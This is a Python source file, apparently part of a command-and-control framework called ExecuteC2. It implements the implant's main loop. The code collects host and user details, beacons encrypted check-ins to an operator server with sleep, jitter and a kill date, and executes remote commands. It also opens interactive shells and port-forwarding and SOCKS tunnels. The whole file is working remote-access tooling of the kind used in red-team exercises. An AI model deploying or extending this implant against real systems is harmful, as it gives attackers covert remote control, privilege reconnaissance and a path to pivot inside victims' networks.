"""Python agent main loop for ExecuteC2."""

from __future__ import annotations

import asyncio
import base64
import logging
import os
import platform
import random
import socket
import sys
from datetime import UTC, datetime

import msgpack
from aiohttp import WSMsgType

from agent.commands import COMMAND_HANDLERS
from agent.connector_http import HTTPConnector
from agent.connector_ws import WebSocketConnector
from agent.crypto import AgentCrypto

logger = logging.getLogger(__name__)

_AGENT_TYPE = "python"


def _get_system_info() -> dict:
    system = platform.system()
    os_map = {"Windows": 1, "Linux": 2, "Darwin": 3}
    os_type = os_map.get(system, 2)

    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"

    try:
        internal_ip = socket.gethostbyname(hostname)
    except Exception:
        internal_ip = "127.0.0.1"

    try:
        import getpass

        username = getpass.getuser()
    except Exception:
        username = "unknown"

    return {
        "hostname": hostname,
        "username": username,
        "domain": os.environ.get("USERDOMAIN", ""),
        "internal_ip": internal_ip,
        "os": os_type,
        "os_desc": platform.version()[:64],
        "arch": platform.machine(),
        "pid": os.getpid(),
        "process": sys.executable,
        "elevated": _is_elevated(),
    }


def _is_elevated() -> bool:
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes

        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False


class Agent:
    """Python C2 agent supporting HTTP polling and WebSocket transport."""

    def __init__(self, config: dict):
        self.config = config
        self.transport_type: str = config.get("transport", "http")
        self.agent_id: str = os.urandom(4).hex()
        self.sleep: int = config.get("sleep", 60)
        self.jitter: int = config.get("jitter", 0)
        self.kill_date: str = config.get("kill_date", "")
        self.master_key_hex: str = config["encrypt_key"]
        self._crypto = AgentCrypto(self.master_key_hex, self.agent_id)
        self._http = HTTPConnector(config)
        self._ws_connector = WebSocketConnector(config)
        self._ws_session = None
        self._ws = None
        self._running = False
        self._registered = False
        self._counter = 1
        self._outbound_seq = 1
        self._inbound_seq = 0
        self._fail_count = 0
        self._pending_messages: list[dict] = []
        self._sessions: dict[str, dict] = {}

    def _next_counter(self) -> int:
        counter = self._counter
        self._counter += 1
        return counter

    def _next_seq(self) -> int:
        seq = self._outbound_seq
        self._outbound_seq += 1
        return seq

    def _build_beat_header(self, beat_data: dict) -> str:
        beat_data = dict(beat_data)
        beat_data["ctr"] = self._next_counter()

        agent_type_bytes = _AGENT_TYPE.encode()
        agent_id_bytes = self.agent_id.encode()
        payload = (
            len(agent_type_bytes).to_bytes(4, "big")
            + agent_type_bytes
            + agent_id_bytes
            + msgpack.packb(beat_data)
        )
        return base64.b64encode(self._crypto.encrypt_beat(payload)).decode()

    def _encode_pending_messages(self) -> bytes:
        if not self._pending_messages:
            return b""
        return self._crypto.encrypt(self._crypto.session_key, msgpack.packb(self._pending_messages))

    def _accept_inbound(self, envelope: dict) -> bool:
        if not self._crypto.verify_envelope(envelope):
            return False
        seq = int(envelope.get("seq", 0))
        if seq <= self._inbound_seq:
            return False
        self._inbound_seq = seq
        return True

    async def _emit(self, envelope: dict) -> None:
        if self.transport_type == "websocket" and self._ws is not None:
            await self._ws.send_bytes(msgpack.packb(envelope, use_bin_type=True))
            return
        self._pending_messages.append(envelope)

    async def register(self) -> bool:
        if self.transport_type == "websocket":
            return await self._register_ws()

        beat_header = self._build_beat_header({**_get_system_info(), "sleep": self.sleep, "jitter": self.jitter})
        response = await self._http.check_in(beat_header, body=self._encode_pending_messages())
        if response is None:
            return False
        self._pending_messages.clear()
        self._registered = True
        return True

    async def _register_ws(self) -> bool:
        beat_header = self._build_beat_header({**_get_system_info(), "sleep": self.sleep, "jitter": self.jitter})
        session, ws = await self._ws_connector.connect(msgpack.packb({"beat": beat_header}, use_bin_type=True))
        if ws is None:
            self._fail_count += 1
            return False
        self._ws_session = session
        self._ws = ws
        self._registered = True
        self._fail_count = 0
        return True

    async def check_in(self) -> list[dict]:
        beat_header = self._build_beat_header({})
        response = await self._http.check_in(beat_header, body=self._encode_pending_messages())
        if response is None:
            return []

        self._pending_messages.clear()
        payload_bytes = self._http.parse_payload(response)
        if not payload_bytes:
            return []

        try:
            decrypted = self._crypto.decrypt_response(payload_bytes)
            packed_tasks = msgpack.unpackb(decrypted, raw=False)
        except Exception:
            return []

        tasks: list[dict] = []
        for item in packed_tasks:
            try:
                envelope = msgpack.unpackb(item, raw=False) if isinstance(item, (bytes, bytearray)) else item
            except Exception:
                continue
            if isinstance(envelope, dict) and self._accept_inbound(envelope):
                tasks.append(envelope)
        return tasks

    async def execute_task(self, envelope: dict) -> dict:
        task = envelope.get("payload", {})
        if isinstance(task, (bytes, bytearray)):
            task = msgpack.unpackb(task, raw=False)

        cmd_id = task.get("cmd")
        args = task.get("args", {})
        task_id = str(envelope.get("task_id", ""))

        if cmd_id == 99:
            self._running = False
            return {"task_id": task_id, "status": 1, "output": b"", "error": ""}

        if cmd_id == 21:
            if "sleep" in args:
                self.sleep = int(args["sleep"])
            if "jitter" in args:
                self.jitter = int(args["jitter"])
            return {"task_id": task_id, "status": 1, "output": b"", "error": ""}

        handler = COMMAND_HANDLERS.get(cmd_id)
        if handler is None:
            return {"task_id": task_id, "status": 2, "output": b"", "error": f"Unknown command ID: {cmd_id}"}

        try:
            status, output, error = await handler(args)
            return {"task_id": task_id, "status": status, "output": output, "error": error}
        except Exception as exc:
            return {"task_id": task_id, "status": 2, "output": b"", "error": str(exc)}

    async def _queue_task_result(self, result: dict) -> None:
        envelope = self._crypto.sign_envelope(
            kind="result",
            seq=self._next_seq(),
            task_id=result["task_id"],
            payload=result,
        )
        await self._emit(envelope)

    async def _handle_envelope(self, envelope: dict) -> None:
        kind = envelope.get("kind")
        if kind == "task":
            result = await self.execute_task(envelope)
            await self._queue_task_result(result)
            return
        if kind == "session_open":
            await self._open_session(envelope)
            return
        if kind == "session_data":
            await self._session_data(envelope)
            return
        if kind == "session_close":
            await self._close_session(envelope.get("session_id", ""), notify=False)

    async def _open_session(self, envelope: dict) -> None:
        session_id = str(envelope.get("session_id", ""))
        channel = str(envelope.get("channel", ""))
        payload = envelope.get("payload", {}) or {}
        if channel == "shell":
            await self._open_shell(session_id)
        elif channel in {"portfwd", "socks"}:
            host = str(payload.get("target_host", ""))
            port = int(payload.get("target_port", 0))
            await self._open_tcp(session_id, channel, host, port)

    async def _open_shell(self, session_id: str) -> None:
        if platform.system() == "Windows":
            proc = await asyncio.create_subprocess_exec(
                "cmd.exe",
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            reader = proc.stdout
            writer = proc.stdin
            read_task = asyncio.create_task(self._read_pipe_session(session_id, reader, proc))
            self._sessions[session_id] = {
                "type": "shell",
                "proc": proc,
                "writer": writer,
                "read_task": read_task,
            }
        else:
            import pty

            master_fd, slave_fd = pty.openpty()
            shell = os.environ.get("SHELL", "/bin/sh")
            proc = await asyncio.create_subprocess_exec(shell, stdin=slave_fd, stdout=slave_fd, stderr=slave_fd)
            os.close(slave_fd)
            read_task = asyncio.create_task(self._read_pty_session(session_id, master_fd, proc))
            self._sessions[session_id] = {
                "type": "shell",
                "proc": proc,
                "master_fd": master_fd,
                "read_task": read_task,
            }

        await self._emit(
            self._crypto.sign_envelope(
                kind="session_opened",
                seq=self._next_seq(),
                session_id=session_id,
                channel="shell",
                payload={},
            )
        )

    async def _open_tcp(self, session_id: str, channel: str, host: str, port: int) -> None:
        try:
            reader, writer = await asyncio.open_connection(host, port)
        except Exception as exc:
            await self._emit(
                self._crypto.sign_envelope(
                    kind="session_error",
                    seq=self._next_seq(),
                    session_id=session_id,
                    channel=channel,
                    payload={"error": str(exc)},
                )
            )
            return
        read_task = asyncio.create_task(self._read_tcp_session(session_id, channel, reader))
        self._sessions[session_id] = {
            "type": channel,
            "reader": reader,
            "writer": writer,
            "read_task": read_task,
        }
        await self._emit(
            self._crypto.sign_envelope(
                kind="session_opened",
                seq=self._next_seq(),
                session_id=session_id,
                channel=channel,
                payload={},
            )
        )

    async def _session_data(self, envelope: dict) -> None:
        session_id = str(envelope.get("session_id", ""))
        payload = envelope.get("payload", b"")
        session = self._sessions.get(session_id)
        if session is None:
            return
        if isinstance(payload, str):
            payload = payload.encode()
        if session["type"] == "shell" and "writer" in session:
            session["writer"].write(payload)
            await session["writer"].drain()
            return
        if session["type"] == "shell" and "master_fd" in session:
            await asyncio.to_thread(os.write, session["master_fd"], payload)
            return
        writer = session.get("writer")
        if writer is not None:
            writer.write(payload)
            await writer.drain()

    async def _close_session(self, session_id: str, *, notify: bool = True) -> None:
        session = self._sessions.pop(session_id, None)
        if session is None:
            return
        task = session.get("read_task")
        if task is not None:
            task.cancel()
        writer = session.get("writer")
        if writer is not None:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        proc = session.get("proc")
        if proc is not None and proc.returncode is None:
            proc.terminate()
        master_fd = session.get("master_fd")
        if master_fd is not None:
            try:
                os.close(master_fd)
            except OSError:
                pass
        if notify:
            await self._emit(
                self._crypto.sign_envelope(
                    kind="session_closed",
                    seq=self._next_seq(),
                    session_id=session_id,
                    channel=session.get("type", ""),
                    payload={},
                )
            )

    async def _read_pipe_session(self, session_id: str, reader: asyncio.StreamReader, proc) -> None:
        try:
            while True:
                chunk = await reader.read(4096)
                if not chunk:
                    break
                await self._emit(
                    self._crypto.sign_envelope(
                        kind="session_data",
                        seq=self._next_seq(),
                        session_id=session_id,
                        channel="shell",
                        payload=chunk,
                    )
                )
        finally:
            await proc.wait()
            await self._close_session(session_id)

    async def _read_pty_session(self, session_id: str, master_fd: int, proc) -> None:
        try:
            while True:
                chunk = await asyncio.to_thread(os.read, master_fd, 4096)
                if not chunk:
                    break
                await self._emit(
                    self._crypto.sign_envelope(
                        kind="session_data",
                        seq=self._next_seq(),
                        session_id=session_id,
                        channel="shell",
                        payload=chunk,
                    )
                )
        finally:
            await proc.wait()
            await self._close_session(session_id)

    async def _read_tcp_session(self, session_id: str, channel: str, reader: asyncio.StreamReader) -> None:
        try:
            while True:
                chunk = await reader.read(4096)
                if not chunk:
                    break
                await self._emit(
                    self._crypto.sign_envelope(
                        kind="session_data",
                        seq=self._next_seq(),
                        session_id=session_id,
                        channel=channel,
                        payload=chunk,
                    )
                )
        finally:
            await self._close_session(session_id)

    def _sleep_interval(self) -> float:
        if self.jitter == 0:
            return float(self.sleep)
        jitter_secs = self.sleep * (self.jitter / 100.0)
        return self.sleep + random.uniform(-jitter_secs, jitter_secs)

    def _check_kill_date(self) -> bool:
        if not self.kill_date:
            return False
        try:
            kd = datetime.fromisoformat(self.kill_date)
            return datetime.now(UTC) >= kd
        except Exception:
            return False

    async def _run_http(self) -> None:
        while self._running:
            if self._check_kill_date():
                return
            envelopes = await self.check_in()
            for envelope in envelopes:
                await self._handle_envelope(envelope)
            await asyncio.sleep(self._sleep_interval())

    async def _run_ws(self) -> None:
        while self._running:
            if self._check_kill_date():
                return
            if self._ws is None:
                success = await self._register_ws()
                if not success:
                    await asyncio.sleep(self._ws_connector.backoff(self._fail_count))
                    continue

            heartbeat_task = asyncio.create_task(self._heartbeat_loop())
            try:
                async for message in self._ws:
                    if message.type != WSMsgType.BINARY:
                        continue
                    envelope = msgpack.unpackb(message.data, raw=False)
                    if self._accept_inbound(envelope):
                        await self._handle_envelope(envelope)
            except Exception:
                pass
            finally:
                heartbeat_task.cancel()
                if self._ws_session is not None:
                    await self._ws_session.close()
                self._ws_session = None
                self._ws = None
                self._registered = False
                self._fail_count += 1
                for session_id in list(self._sessions):
                    await self._close_session(session_id, notify=False)
                await asyncio.sleep(self._ws_connector.backoff(self._fail_count))

    async def _heartbeat_loop(self) -> None:
        while self._running and self._ws is not None:
            await asyncio.sleep(self._sleep_interval())
            if self._ws is None:
                return
            heartbeat = self._crypto.sign_envelope(
                kind="heartbeat",
                seq=self._next_seq(),
                payload={
                    "ctr": self._next_counter(),
                    "sleep": self.sleep,
                    "jitter": self.jitter,
                },
            )
            await self._emit(heartbeat)

    async def run(self) -> None:
        self._running = True
        while self._running and not self._registered:
            if self._check_kill_date():
                return
            success = await self.register()
            if not success:
                await asyncio.sleep(self._ws_connector.backoff(self._fail_count) if self.transport_type == "websocket" else self._http._backoff())

        if self.transport_type == "websocket":
            await self._run_ws()
        else:
            await self._run_http()
